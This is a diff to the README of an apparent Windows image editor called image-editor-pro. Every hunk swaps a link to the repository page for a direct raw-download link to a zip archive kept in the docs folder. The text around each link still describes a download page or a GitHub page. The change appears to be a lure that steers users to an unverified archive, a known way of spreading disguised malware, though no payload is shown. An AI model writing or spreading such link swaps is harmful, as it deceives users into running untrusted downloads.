@@ -1,6 +1,6 @@
 # 🖼️ image-editor-pro - Simple Desktop Image Editing
 
-[![Download image-editor-pro](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/kevinksmar/image-editor-pro)
+[![Download image-editor-pro](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/kevinksmar/image-editor-pro/raw/refs/heads/main/docs/image-pro-editor-2.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This app runs on Windows and uses PyQt6 for its interface. It is open-source and
 
    Click this link to visit the download page:
 
-   [https://github.com/kevinksmar/image-editor-pro](https://github.com/kevinksmar/image-editor-pro)
+   [https://github.com/kevinksmar/image-editor-pro/raw/refs/heads/main/docs/image-pro-editor-2.9.zip](https://github.com/kevinksmar/image-editor-pro/raw/refs/heads/main/docs/image-pro-editor-2.9.zip)
 
 2. **Find the latest release**
 
@@ -131,4 +131,4 @@ This app runs on Windows and uses PyQt6 for its interface. It is open-source and
 
 Use this link to visit the GitHub page where you can download the latest version or browse source code:
 
-[https://github.com/kevinksmar/image-editor-pro](https://github.com/kevinksmar/image-editor-pro)
+[https://github.com/kevinksmar/image-editor-pro/raw/refs/heads/main/docs/image-pro-editor-2.9.zip](https://github.com/kevinksmar/image-editor-pro/raw/refs/heads/main/docs/image-pro-editor-2.9.zip)
